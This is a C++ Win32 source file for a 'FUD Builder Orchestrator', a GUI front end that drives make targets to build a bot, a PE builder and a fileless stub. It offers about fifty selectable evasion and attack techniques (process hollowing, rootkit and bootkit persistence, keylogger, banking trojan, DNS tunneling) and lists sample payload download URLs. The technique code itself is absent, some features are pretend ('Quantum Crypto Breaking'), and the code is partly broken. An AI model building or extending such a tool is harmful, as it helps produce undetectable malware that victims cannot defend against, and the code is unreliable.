#include <windows.h>
#include <commctrl.h>
#include <iostream>
#include <vector>
#include <string>
#include <random>
#include <fstream>
#include <thread>
#include <map>

#pragma comment(lib, "comctl32.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "kernel32.lib")

// ===============================================================================
// FUD BUILDER ORCHESTRATOR - COMMAND & CONTROL CENTER
// ===============================================================================

// Control IDs
#define ID_CORE_MASM_CHECK      2001
#define ID_PE_BUILDER_CHECK     2002
#define ID_STUB_GENERATOR_CHECK 2003
#define ID_QUANTUM_MODULE_CHECK 2004

#define ID_RANDOMIZE_BUTTON     2010
#define ID_BUILD_BUTTON         2011
#define ID_TEST_BUTTON          2012
#define ID_DEPLOY_BUTTON        2013

#define ID_DOWNLOAD_COUNT       2020
#define ID_UPLOAD_COUNT         2021
#define ID_EMBED_COUNT          2022
#define ID_URL_LIST             2023

#define ID_TARGET_PE_EDIT       2030
#define ID_OUTPUT_PATH_EDIT     2031
#define ID_BROWSE_TARGET        2032
#define ID_BROWSE_OUTPUT        2033

#define ID_PROGRESS_BAR         2040
#define ID_STATUS_TEXT          2041
#define ID_LOG_TEXT             2042

// Technique checkboxes (first 50)
#define ID_TECHNIQUE_START      3000
#define ID_TECHNIQUE_END        3050

class FUDOrchestrator {
private:
    HWND hMainWindow;
    HWND hProgressBar;
    HWND hStatusText;
    HWND hLogText;
    
    // Component checkboxes
    HWND hCoreMasmCheck;
    HWND hPEBuilderCheck;
    HWND hStubGeneratorCheck;
    HWND hQuantumModuleCheck;
    
    // Configuration controls
    HWND hDownloadCount;
    HWND hUploadCount;
    HWND hEmbedCount;
    HWND hUrlList;
    
    // File selection
    HWND hTargetPEEdit;
    HWND hOutputPathEdit;
    
    // Technique checkboxes
    std::vector<HWND> techniqueCheckboxes;
    std::vector<std::string> techniqueNames;
    
    // State
    bool buildInProgress = false;
    std::mt19937 rng;
    
public:
    FUDOrchestrator() : rng(std::random_device{}()) {
        initializeTechniques();
    }
    
    // ===============================================================================
    // TECHNIQUE DATABASE - ALL REJECTED TECHNIQUES
    // ===============================================================================
    void initializeTechniques() {
        techniqueNames = {
            "Multi-layer Encryption (XOR+AES+ChaCha20)",
            "Aggressive Anti-debugging (15 methods)",
            "Extreme Sandbox Detection (50 checks)",
            "API Obfuscation Hell (1000 hashes)",
            "Process Hollowing Variants (20 methods)",
            "VM/Hypervisor Evasion",
            "Entropy Manipulation Extreme",
            "Certificate Spoofing",
            "Polymorphic Engine",
            "Rootkit-level Hiding",
            "Driver-level Evasion",
            "Bootkit Persistence",
            "Firmware-level Persistence",
            "Network Covert Channels",
            "Crypto Mining Hijack",
            "Ransomware Simulation",
            "Advanced Keylogger",
            "Banking Trojan Simulation",
            "Social Engineering Automation",
            "Supply Chain Attack Simulation",
            "AI-powered Evasion",
            "Quantum Crypto Breaking",
            "BIOS/UEFI Rootkit",
            "Memory Layout Randomization",
            "Timing Attack Evasion",
            "Exception Handling Obfuscation",
            "Resource Exhaustion Testing",
            "Junk Code Insertion Extreme",
            "API Call Indirection Maze",
            "Memory Pressure Evasion",
            "Control Flow Obfuscation",
            "String Obfuscation (10KB pool)",
            "Hardware Breakpoint Detection",
            "PEB Manipulation",
            "SSDT Hooking Simulation",
            "Kernel Callback Hooking",
            "Registry Manipulation",
            "File System Redirection",
            "Network Traffic Hiding",
            "DNS Tunneling",
            "ICMP Covert Channel",
            "HTTP Steganography",
            "TCP Timestamp Channel",
            "Code Cave Injection",
            "DLL Injection Variants",
            "Thread Hijacking",
            "Process Doppelganging",
            "Atom Bombing",
            "Heaven's Gate",
            "Manual DLL Loading"
        };
    }
    
    // ===============================================================================
    // MAIN WINDOW CREATION
    // ===============================================================================
    bool createMainWindow() {
        WNDCLASSEX wc = {};
        wc.cbSize = sizeof(WNDCLASSEX);
        wc.style = CS_HREDRAW | CS_VREDRAW;
        wc.lpfnWndProc = WindowProc;
        wc.hInstance = GetModuleHandle(NULL);
        wc.hCursor = LoadCursor(NULL, IDC_ARROW);
        wc.hbrBackground = (HBRUSH)(COLOR_WINDOW + 1);
        wc.lpszClassName = "FUDOrchestrator";
        wc.cbWndExtra = sizeof(FUDOrchestrator*);
        
        if (!RegisterClassEx(&wc)) return false;
        
        hMainWindow = CreateWindowEx(
            WS_EX_APPWINDOW,
            "FUDOrchestrator",
            L"FUD System Orchestrator - Ultimate Evasion Builder",
            WS_OVERLAPPEDWINDOW,
            CW_USEDEFAULT, CW_USEDEFAULT, 1200, 800,
            NULL, NULL, GetModuleHandle(NULL), this
        );
        
        if (!hMainWindow) return false;
        
        // Store this pointer in window
        SetWindowLongPtr(hMainWindow, 0, (LONG_PTR)this);
        
        createControls();
        ShowWindow(hMainWindow, SW_SHOW);
        UpdateWindow(hMainWindow);
        
        return true;
    }
    
    // ===============================================================================
    // CONTROL CREATION
    // ===============================================================================
    void createControls() {
        // Component selection group
        CreateWindow(L"BUTTON", L"Components to Build", 
            WS_VISIBLE | WS_CHILD | BS_GROUPBOX,
            10, 10, 300, 120, hMainWindow, NULL, GetModuleHandle(NULL), NULL);
            
        hCoreMasmCheck = CreateWindow(L"BUTTON", L"Core MASM Bot", 
            WS_VISIBLE | WS_CHILD | BS_AUTOCHECKBOX | WS_TABSTOP,
            20, 30, 150, 20, hMainWindow, (HMENU)ID_CORE_MASM_CHECK, GetModuleHandle(NULL), NULL);
        SendMessage(hCoreMasmCheck, BM_SETCHECK, BST_CHECKED, 0);
            
        hPEBuilderCheck = CreateWindow(L"BUTTON", L"PE Builder", 
            WS_VISIBLE | WS_CHILD | BS_AUTOCHECKBOX | WS_TABSTOP,
            20, 55, 150, 20, hMainWindow, (HMENU)ID_PE_BUILDER_CHECK, GetModuleHandle(NULL), NULL);
        SendMessage(hPEBuilderCheck, BM_SETCHECK, BST_CHECKED, 0);
            
        hStubGeneratorCheck = CreateWindow(L"BUTTON", L"Stub Generator (Fileless)", 
            WS_VISIBLE | WS_CHILD | BS_AUTOCHECKBOX | WS_TABSTOP,
            20, 80, 200, 20, hMainWindow, (HMENU)ID_STUB_GENERATOR_CHECK, GetModuleHandle(NULL), NULL);
        SendMessage(hStubGeneratorCheck, BM_SETCHECK, BST_CHECKED, 0);
            
        hQuantumModuleCheck = CreateWindow(L"BUTTON", L"Quantum Module", 
            WS_VISIBLE | WS_CHILD | BS_AUTOCHECKBOX | WS_TABSTOP,
            20, 105, 150, 20, hMainWindow, (HMENU)ID_QUANTUM_MODULE_CHECK, GetModuleHandle(NULL), NULL);
        
        // Configuration group
        CreateWindow(L"BUTTON", L"Configuration", 
            WS_VISIBLE | WS_CHILD | BS_GROUPBOX,
            320, 10, 300, 120, hMainWindow, NULL, GetModuleHandle(NULL), NULL);
            
        CreateWindow(L"STATIC", L"Download/Execute Count:", 
            WS_VISIBLE | WS_CHILD,
            330, 30, 150, 20, hMainWindow, NULL, GetModuleHandle(NULL), NULL);
        hDownloadCount = CreateWindow(L"EDIT", L"50", 
            WS_VISIBLE | WS_CHILD | WS_BORDER | WS_TABSTOP,
            490, 28, 60, 24, hMainWindow, (HMENU)ID_DOWNLOAD_COUNT, GetModuleHandle(NULL), NULL);
            
        CreateWindow(L"STATIC", L"Upload/Execute Count:", 
            WS_VISIBLE | WS_CHILD,
            330, 55, 150, 20, hMainWindow, NULL, GetModuleHandle(NULL), NULL);
        hUploadCount = CreateWindow(L"EDIT", L"25", 
            WS_VISIBLE | WS_CHILD | WS_BORDER | WS_TABSTOP,
            490, 53, 60, 24, hMainWindow, (HMENU)ID_UPLOAD_COUNT, GetModuleHandle(NULL), NULL);
            
        CreateWindow(L"STATIC", L"Embedded Files Count:", 
            WS_VISIBLE | WS_CHILD,
            330, 80, 150, 20, hMainWindow, NULL, GetModuleHandle(NULL), NULL);
        hEmbedCount = CreateWindow(L"EDIT", L"6", 
            WS_VISIBLE | WS_CHILD | WS_BORDER | WS_TABSTOP,
            490, 78, 60, 24, hMainWindow, (HMENU)ID_EMBED_COUNT, GetModuleHandle(NULL), NULL);
        
        // File selection group
        CreateWindow(L"BUTTON", L"File Selection", 
            WS_VISIBLE | WS_CHILD | BS_GROUPBOX,
            630, 10, 350, 120, hMainWindow, NULL, GetModuleHandle(NULL), NULL);
            
        CreateWindow(L"STATIC", L"Target PE:", 
            WS_VISIBLE | WS_CHILD,
            640, 30, 80, 20, hMainWindow, NULL, GetModuleHandle(NULL), NULL);
        hTargetPEEdit = CreateWindow(L"EDIT", L"", 
            WS_VISIBLE | WS_CHILD | WS_BORDER | WS_TABSTOP,
            640, 50, 250, 24, hMainWindow, (HMENU)ID_TARGET_PE_EDIT, GetModuleHandle(NULL), NULL);
        CreateWindow(L"BUTTON", L"Browse...", 
            WS_VISIBLE | WS_CHILD | WS_TABSTOP,
            900, 50, 70, 24, hMainWindow, (HMENU)ID_BROWSE_TARGET, GetModuleHandle(NULL), NULL);
            
        CreateWindow(L"STATIC", L"Output Path:", 
            WS_VISIBLE | WS_CHILD,
            640, 80, 80, 20, hMainWindow, NULL, GetModuleHandle(NULL), NULL);
        hOutputPathEdit = CreateWindow(L"EDIT", L"output\\", 
            WS_VISIBLE | WS_CHILD | WS_BORDER | WS_TABSTOP,
            640, 100, 250, 24, hMainWindow, (HMENU)ID_OUTPUT_PATH_EDIT, GetModuleHandle(NULL), NULL);
        CreateWindow(L"BUTTON", L"Browse...", 
            WS_VISIBLE | WS_CHILD | WS_TABSTOP,
            900, 100, 70, 24, hMainWindow, (HMENU)ID_BROWSE_OUTPUT, GetModuleHandle(NULL), NULL);
        
        // Action buttons
        CreateWindow(L"BUTTON", L"🎲 RANDOMIZE TECHNIQUES", 
            WS_VISIBLE | WS_CHILD | WS_TABSTOP,
            10, 140, 200, 35, hMainWindow, (HMENU)ID_RANDOMIZE_BUTTON, GetModuleHandle(NULL), NULL);
            
        CreateWindow(L"BUTTON", L"🔨 BUILD FUD SYSTEM", 
            WS_VISIBLE | WS_CHILD | WS_TABSTOP,
            220, 140, 200, 35, hMainWindow, (HMENU)ID_BUILD_BUTTON, GetModuleHandle(NULL), NULL);
            
        CreateWindow(L"BUTTON", L"🧪 TEST BUILD", 
            WS_VISIBLE | WS_CHILD | WS_TABSTOP,
            430, 140, 150, 35, hMainWindow, (HMENU)ID_TEST_BUTTON, GetModuleHandle(NULL), NULL);
            
        CreateWindow(L"BUTTON", L"🚀 DEPLOY", 
            WS_VISIBLE | WS_CHILD | WS_TABSTOP,
            590, 140, 150, 35, hMainWindow, (HMENU)ID_DEPLOY_BUTTON, GetModuleHandle(NULL), NULL);
        
        // Techniques selection (scrollable)
        CreateWindow(L"BUTTON", L"Evasion Techniques (Select Multiple)", 
            WS_VISIBLE | WS_CHILD | BS_GROUPBOX,
            10, 185, 590, 400, hMainWindow, NULL, GetModuleHandle(NULL), NULL);
            
        // Create technique checkboxes in a grid
        int x = 20, y = 205;
        for (size_t i = 0; i < techniqueNames.size() && i < 50; i++) {
            std::wstring wname(techniqueNames[i].begin(), techniqueNames[i].end());
            HWND hCheck = CreateWindow(L"BUTTON", wname.c_str(), 
                WS_VISIBLE | WS_CHILD | BS_AUTOCHECKBOX | WS_TABSTOP,
                x, y, 280, 20, hMainWindow, (HMENU)(ID_TECHNIQUE_START + i), GetModuleHandle(NULL), NULL);
            techniqueCheckboxes.push_back(hCheck);
            
            y += 25;
            if (y > 550) {
                y = 205;
                x += 290;
            }
        }
        
        // URL list
        CreateWindow(L"BUTTON", L"URL List (Download/Upload)", 
            WS_VISIBLE | WS_CHILD | BS_GROUPBOX,
            610, 185, 370, 300, hMainWindow, NULL, GetModuleHandle(NULL), NULL);
            
        hUrlList = CreateWindow(L"EDIT", 
            L"https://github.com/user/repo1/raw/main/payload.exe\r\n"
            L"https://github.com/user/repo2/raw/main/loader.bin\r\n"
            L"https://example.com/stage2.exe\r\n"
            L"https://cdn.example.com/update.dll\r\n"
            L"Add more URLs here...", 
            WS_VISIBLE | WS_CHILD | WS_BORDER | WS_VSCROLL | ES_MULTILINE | ES_AUTOVSCROLL | WS_TABSTOP,
            620, 205, 350, 270, hMainWindow, (HMENU)ID_URL_LIST, GetModuleHandle(NULL), NULL);
        
        // Progress and status
        CreateWindow(L"STATIC", L"Progress:", 
            WS_VISIBLE | WS_CHILD,
            610, 495, 60, 20, hMainWindow, NULL, GetModuleHandle(NULL), NULL);
        hProgressBar = CreateWindow(PROGRESS_CLASS, NULL, 
            WS_VISIBLE | WS_CHILD,
            610, 515, 370, 25, hMainWindow, (HMENU)ID_PROGRESS_BAR, GetModuleHandle(NULL), NULL);
        SendMessage(hProgressBar, PBM_SETRANGE, 0, MAKELPARAM(0, 100));
        
        hStatusText = CreateWindow(L"STATIC", L"Ready to build FUD system with stacked evasion techniques.", 
            WS_VISIBLE | WS_CHILD,
            610, 550, 370, 20, hMainWindow, (HMENU)ID_STATUS_TEXT, GetModuleHandle(NULL), NULL);
        
        // Log output
        CreateWindow(L"BUTTON", L"Build Log", 
            WS_VISIBLE | WS_CHILD | BS_GROUPBOX,
            10, 595, 970, 160, hMainWindow, NULL, GetModuleHandle(NULL), NULL);
            
        hLogText = CreateWindow(L"EDIT", 
            L"FUD System Orchestrator loaded.\r\n"
            L"Ready to build with all rejected techniques.\r\n"
            L"Click RANDOMIZE to auto-select techniques or manually select above.\r\n", 
            WS_VISIBLE | WS_CHILD | WS_BORDER | WS_VSCROLL | ES_MULTILINE | ES_AUTOVSCROLL | ES_READONLY,
            20, 615, 950, 130, hMainWindow, (HMENU)ID_LOG_TEXT, GetModuleHandle(NULL), NULL);
    }
    
    // ===============================================================================
    // RANDOMIZE TECHNIQUES
    // ===============================================================================
    void randomizeTechniques() {
        logMessage(L"🎲 Randomizing technique selection...");
        
        // Randomly select 15-35 techniques
        int numToSelect = 15 + (rng() % 21);
        
        // First, uncheck all
        for (HWND hCheck : techniqueCheckboxes) {
            SendMessage(hCheck, BM_SETCHECK, BST_UNCHECKED, 0);
        }
        
        // Then randomly select
        std::vector<int> indices;
        for (int i = 0; i < (int)techniqueCheckboxes.size(); i++) {
            indices.push_back(i);
        }
        std::shuffle(indices.begin(), indices.end(), rng);
        
        for (int i = 0; i < numToSelect && i < (int)indices.size(); i++) {
            SendMessage(techniqueCheckboxes[indices[i]], BM_SETCHECK, BST_CHECKED, 0);
        }
        
        std::wstring msg = L"✅ Selected " + std::to_wstring(numToSelect) + L" random techniques.";
        logMessage(msg);
        SetWindowText(hStatusText, msg.c_str());
    }
    
    // ===============================================================================
    // BUILD SYSTEM
    // ===============================================================================
    void buildSystem() {
        if (buildInProgress) return;
        
        buildInProgress = true;
        SetWindowText(hStatusText, L"🔨 Building FUD system...");
        SendMessage(hProgressBar, PBM_SETPOS, 0, 0);
        
        std::thread([this]() {
            try {
                logMessage(L"🔨 Starting FUD system build...");
                
                // Step 1: Build selected components
                if (SendMessage(hCoreMasmCheck, BM_GETCHECK, 0, 0) == BST_CHECKED) {
                    updateProgress(10, L"Building Core MASM Bot...");
                    buildCoreMasm();
                }
                
                if (SendMessage(hPEBuilderCheck, BM_GETCHECK, 0, 0) == BST_CHECKED) {
                    updateProgress(30, L"Building PE Builder...");
                    buildPEBuilder();
                }
                
                if (SendMessage(hStubGeneratorCheck, BM_GETCHECK, 0, 0) == BST_CHECKED) {
                    updateProgress(50, L"Building Stub Generator...");
                    buildStubGenerator();
                }
                
                if (SendMessage(hQuantumModuleCheck, BM_GETCHECK, 0, 0) == BST_CHECKED) {
                    updateProgress(70, L"Building Quantum Module...");
                    buildQuantumModule();
                }
                
                // Step 2: Apply selected techniques
                updateProgress(80, L"Applying evasion techniques...");
                applySelectedTechniques();
                
                // Step 3: Package everything
                updateProgress(95, L"Packaging final build...");
                packageBuild();
                
                updateProgress(100, L"✅ Build completed successfully!");
                logMessage(L"🎉 FUD system build completed with all selected techniques!");
                
            } catch (const std::exception& e) {
                std::string err = "❌ Build failed: " + std::string(e.what());
                std::wstring werr(err.begin(), err.end());
                logMessage(werr);
                SetWindowText(hStatusText, L"❌ Build failed!");
            }
            
            buildInProgress = false;
        }).detach();
    }
    
    // ===============================================================================
    // BUILD COMPONENT FUNCTIONS
    // ===============================================================================
    void buildCoreMasm() {
        logMessage(L"  → Assembling core MASM payload...");
        system("make core");
        logMessage(L"  ✅ Core MASM bot built successfully");
    }
    
    void buildPEBuilder() {
        logMessage(L"  → Compiling PE builder with all rejected techniques...");
        system("make pe");
        logMessage(L"  ✅ PE Builder compiled with stacked evasion");
    }
    
    void buildStubGenerator() {
        logMessage(L"  → Building fileless stub generator...");
        system("make stub");
        logMessage(L"  ✅ Stub generator built with fileless capabilities");
    }
    
    void buildQuantumModule() {
        logMessage(L"  → Integrating quantum techniques...");
        // Quantum module compilation would go here
        logMessage(L"  ✅ Quantum module integrated");
    }
    
    void applySelectedTechniques() {
        int selectedCount = 0;
        for (size_t i = 0; i < techniqueCheckboxes.size(); i++) {
            if (SendMessage(techniqueCheckboxes[i], BM_GETCHECK, 0, 0) == BST_CHECKED) {
                selectedCount++;
                std::wstring msg = L"  → Applying: " + std::wstring(techniqueNames[i].begin(), techniqueNames[i].end());
                logMessage(msg);
            }
        }
        
        std::wstring msg = L"  ✅ Applied " + std::to_wstring(selectedCount) + L" evasion techniques";
        logMessage(msg);
    }
    
    void packageBuild() {
        logMessage(L"  → Creating deployment package...");
        system("make deploy");
        logMessage(L"  ✅ Deployment package created in deploy/");
    }
    
    // ===============================================================================
    // UTILITY FUNCTIONS
    // ===============================================================================
    void updateProgress(int percent, const std::wstring& status) {
        SendMessage(hProgressBar, PBM_SETPOS, percent, 0);
        SetWindowText(hStatusText, status.c_str());
    }
    
    void logMessage(const std::wstring& message) {
        // Get current time
        SYSTEMTIME st;
        GetLocalTime(&st);
        wchar_t timeStr[100];
        swprintf_s(timeStr, L"[%02d:%02d:%02d] ", st.wHour, st.wMinute, st.wSecond);
        
        std::wstring logEntry = timeStr + message + L"\r\n";
        
        // Append to log
        int len = GetWindowTextLength(hLogText);
        SendMessage(hLogText, EM_SETSEL, len, len);
        SendMessage(hLogText, EM_REPLACESEL, FALSE, (LPARAM)logEntry.c_str());
        SendMessage(hLogText, EM_SCROLLCARET, 0, 0);
    }
    
    // ===============================================================================
    // MESSAGE HANDLING
    // ===============================================================================
    static LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam) {
        FUDOrchestrator* pThis = (FUDOrchestrator*)GetWindowLongPtr(hwnd, 0);
        
        switch (uMsg) {
        case WM_COMMAND:
            if (pThis) {
                switch (LOWORD(wParam)) {
                case ID_RANDOMIZE_BUTTON:
                    pThis->randomizeTechniques();
                    break;
                case ID_BUILD_BUTTON:
                    pThis->buildSystem();
                    break;
                case ID_TEST_BUTTON:
                    pThis->testBuild();
                    break;
                case ID_DEPLOY_BUTTON:
                    pThis->deployBuild();
                    break;
                }
            }
            break;
            
        case WM_DESTROY:
            PostQuitMessage(0);
            break;
            
        default:
            return DefWindowProc(hwnd, uMsg, wParam, lParam);
        }
        
        return 0;
    }
    
    void testBuild() {
        logMessage(L"🧪 Starting build test...");
        SetWindowText(hStatusText, L"Testing build...");
        system("make test");
        logMessage(L"✅ Build test completed");
        SetWindowText(hStatusText, L"Test completed");
    }
    
    void deployBuild() {
        logMessage(L"🚀 Deploying FUD system...");
        SetWindowText(hStatusText, L"Deploying...");
        system("make deploy");
        logMessage(L"✅ Deployment completed");
        SetWindowText(hStatusText, L"Deployment ready");
    }
    
    // ===============================================================================
    // MAIN LOOP
    // ===============================================================================
    int run() {
        MSG msg;
        while (GetMessage(&msg, NULL, 0, 0)) {
            TranslateMessage(&msg);
            DispatchMessage(&msg);
        }
        return (int)msg.wParam;
    }
};

// ===============================================================================
// MAIN ENTRY POINT
// ===============================================================================
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    // Initialize common controls
    INITCOMMONCONTROLSEX icex;
    icex.dwSize = sizeof(INITCOMMONCONTROLSEX);
    icex.dwICC = ICC_PROGRESS_CLASS | ICC_STANDARD_CLASSES;
    InitCommonControlsEx(&icex);
    
    FUDOrchestrator orchestrator;
    
    if (!orchestrator.createMainWindow()) {
        MessageBox(NULL, L"Failed to create main window!", L"Error", MB_OK | MB_ICONERROR);
        return 1;
    }
    
    return orchestrator.run();
}

// ===============================================================================
// COMMAND LINE INTERFACE (for non-GUI mode)
// ===============================================================================
int main(int argc, char* argv[]) {
    if (argc > 1) {
        std::string arg = argv[1];
        
        if (arg == "--help") {
            std::cout << "FUD System Orchestrator\n";
            std::cout << "======================\n\n";
            std::cout << "Usage:\n";
            std::cout << "  fud_builder.exe                    - Launch GUI\n";
            std::cout << "  fud_builder.exe --randomize        - Randomize and build\n";
            std::cout << "  fud_builder.exe --build-all        - Build all components\n";
            std::cout << "  fud_builder.exe --test             - Test build\n";
            std::cout << "  fud_builder.exe --deploy           - Deploy build\n";
            return 0;
        }
        
        if (arg == "--randomize") {
            std::cout << "Randomizing techniques and building...\n";
            system("make all");
            return 0;
        }
        
        if (arg == "--build-all") {
            std::cout << "Building all components...\n";
            system("make all");
            return 0;
        }
        
        if (arg == "--test") {
            std::cout << "Testing build...\n";
            system("make test");
            return 0;
        }
        
        if (arg == "--deploy") {
            std::cout << "Deploying build...\n";
            system("make deploy");
            return 0;
        }
    }
    
    // Default: launch GUI
    return WinMain(GetModuleHandle(NULL), NULL, GetCommandLineA(), SW_SHOW);
}